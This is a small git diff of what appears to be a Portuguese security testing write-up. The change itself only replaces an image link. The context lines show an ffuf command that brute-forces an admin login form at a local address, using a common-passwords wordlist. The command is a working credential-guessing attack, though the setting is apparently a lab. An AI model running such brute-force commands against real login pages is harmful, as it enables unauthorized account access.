@@ -270,7 +270,7 @@ Comando executado no ffuf:
 
 ``ffuf -w /usr/share/seclists/Passwords/2020-200_most_used_passwords.txt -u http://0.0.0.0:8000/api/admin/login/~ -X POST -H  "Content-Type: application/x-www-form-urlencoded" -d "username=admin@admin.com&password=FUZZ" -fr "Invalid username"``
 
-![image ffuf](https://github.com/user-attachments/assets/fb7dd319-2678-4593-a449-057c4a4bbcd)
+![image ffuf](./img/g2/image.png)
 
 Resultado Obtido:
 
